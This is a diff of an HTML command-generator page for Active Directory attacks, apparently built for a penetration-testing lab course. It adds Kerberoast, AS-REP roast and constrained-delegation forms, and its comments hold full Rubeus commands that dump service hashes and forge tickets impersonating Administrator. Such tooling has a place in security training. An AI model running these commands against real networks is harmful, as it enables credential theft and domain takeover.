@@ -49,6 +49,7 @@
             <!-- <li><a class="nav-link" data-toggle="tab" href="#nav-cross-forest">Cross Forest</a></li> -->
             <li><a class="nav-link" data-toggle="tab" href="#nav-inter-forest">Inter Forest</a></li>
             <li><a class="nav-link" data-toggle="tab" href="#nav-kerberor-tickets">Kerberos Tickets</a></li>
+            <li><a class="nav-link" data-toggle="tab" href="#nav-kerberoast">Roasting</a></li>
             <li><a class="nav-link" data-toggle="tab" href="#nav-dump-hashes">Dump Hashes</a></li>
             <li><a class="nav-link" data-toggle="tab" href="#nav-delegation">Delegation</a></li>
             <li><a class="nav-link" data-toggle="tab" href="#nav-bypass-av">Bypass AV</a></li>
@@ -173,7 +174,7 @@
                         <input type="text" class="form-control" id="target-domain" name="target-domain" required>
                     </div>
                     <div class="form-group">
-                        <label for="dc">Domain Controller:</label>
+                        <label for="dc">Domain Controller: (Ex: dcorp-dc.dollarcorp.moneycorp.local)</label>
                         <input type="text" class="form-control" id="dc" name="dc" required>
                     </div>
                     <div class="form-group">
@@ -315,7 +316,11 @@
                         <input type="text" class="form-control" id="target-domain" name="target-domain" required>
                     </div>
                     <div class="form-group">
-                        <label for="service">Service:</label>
+                        <label for="current-domain-sid">Target Domain SID:</label>
+                        <input type="text" class="form-control" id="current-domain-sid" name="current-sid">
+                    </div>
+                    <div class="form-group">
+                        <label for="service">Service SPN: (Ex: http/dcorp-dc.dollarcorp.moneycorp.local)</label>
                         <input type="text" class="form-control" id="service" name="service" required>
                     </div>
                     <div class="form-group">
@@ -414,7 +419,7 @@
                         <input type="text" class="form-control" id="target-domain" name="target-domain" required>
                     </div>
                     <div class="form-group">
-                        <label for="dc">Domain Controller:</label>
+                        <label for="dc">Domain Controller: (Ex: dcorp-dc.dollarcorp.moneycorp.local)</label>
                         <input type="text" class="form-control" id="dc" name="dc" required>
                     </div>
                     <div class="form-group">
@@ -457,6 +462,68 @@
                         </div>
                     </div>
                 </div>
+            </div>
+            
+            <!-- Kerberoast -->
+            <div class="tab-pane fade" id="nav-kerberoast" role="tabpanel" aria-labelledby="nav-kerberoast-tab">
+                <pre class="text-info">Default hash format is: John the Ripper</pre>
+                <!-- Kerberoast -->
+                <!-- Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt -->
+                <h3>Kerberoast</h3>
+                <form id="form-kerberoast">
+                    <div class="form-group">
+                        <label for="user">User (samaccountname):</label>
+                        <input type="text" class="form-control" id="user" name="user" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="outfile">outfile path:</label>
+                        <input type="text" class="form-control" id="outfile" name="outfile" value="true">
+                    </div>
+                    <div class="form-group">
+                        <button class="btn btn-primary" id="generate-command" type="submit">Generate Command</button>
+                    </div>
+                </form>
+                <div class="card bg-dark mb-5">
+                    <div class="card-body">
+                        <div class="input-group">
+                            <input id="command-kerberoast" type="text" class="form-control">
+                            <div class="input-group-append">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- AsRepRoast -->
+                <!-- rubeus.exe asreproast /spn:ldap/dc1.ignite.local/ignite.local /format:hashcat -->
+                <h3>AsRepRoast</h3>
+                <form id="form-asreproast">
+                    <div class="form-group">
+                        <label for="user">SPN: (Ex: ldap/dc1.ignite.local/ignite.local)</label>
+                        <input type="text" class="form-control" id="spn" name="spn" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="outfile">outfile path:</label>
+                        <input type="text" class="form-control" id="outfile" name="outfile" value="true">
+                    </div>
+                    <div class="form-group">
+                        <button class="btn btn-primary" id="generate-command" type="submit">Generate Command</button>
+                    </div>
+                </form>
+                <div class="card bg-dark mb-5">
+                    <div class="card-body">
+                        <div class="input-group">
+                            <input id="command-asreproast" type="text" class="form-control">
+                            <div class="input-group-append">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
             </div>
             
             <!-- Dump Hashes -->
@@ -506,30 +573,47 @@
             </div>
             
             <!-- Delegation -->
-            <div class="tab-pane fade" id="nav-delegation" role="tabpanel" aria-labelledby="nav-delegation-tab">
-                <div class="btn-group mb-3 sticky-top" role="group" id="tool-buttons" data-toggle="buttons">
-                    <label class="btn btn-outline-dark btn-secondary">
-                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Safetykatz.exe"> Safetykatz
-                    </label>
-                    <label class="btn btn-outline-dark btn-secondary">
-                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="BetterSafetykatz.exe"> BetterSafetykatz
-                    </label>
-                    <label class="btn btn-outline-dark btn-secondary">
-                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Mimikatz.exe"> Mimikatz
-                    </label>
-                    <label class="btn btn-outline-dark btn-secondary">
-                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Invoke-Mimikatz"> Invoke-Mimikatz
-                    </label>
-                </div>
-                
-                <!-- Unconstrained -->
-                <form>
-                    <h3>Unconstrained</h3>
+            <div class="tab-pane fade" id="nav-delegation" role="tabpanel" aria-labelledby="nav-delegation-tab">                
+                <!-- Constrained -->
+                <!-- Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt -->
+                <form id="form-constrained">
+                    <h3>Constrained Delegation & RBCD</h3>
                     <div class="form-group">
                         <label for="user">User:</label>
                         <input type="text" class="form-control" id="user" name="user" required>
                     </div>
+                    <div class="form-group">
+                        <label for="aes256">AES 256 key:</label>
+                        <input type="text" class="form-control" id="aes256" name="aes256" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="impersonateuser">Impersonate User:</label>
+                        <input type="text" value="Administrator" class="form-control" id="impersonateuser" name="impersonateuser" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="msdsspn">MSDS SPN: (Ex: cifs/dcorp-mssql.dollarcorp.moneycorp.local)</label>
+                        <input type="text" class="form-control" id="msdsspn" name="msdsspn" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="altservice">Alternate Service: (Ex: ldap)</label>
+                        <input type="text" class="form-control" id="altservice" name="altservice" required>
+                    </div>
+                    <div class="form-group">
+                        <button class="btn btn-primary" id="generate-command" type="submit">Generate Command</button>
+                    </div>
                 </form>
+                <div class="card bg-dark mb-5">
+                    <div class="card-body">
+                        <div class="input-group">
+                            <input id="command-constrained" type="text" class="form-control">
+                            <div class="input-group-append">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
             
             <!-- Bypass AV -->
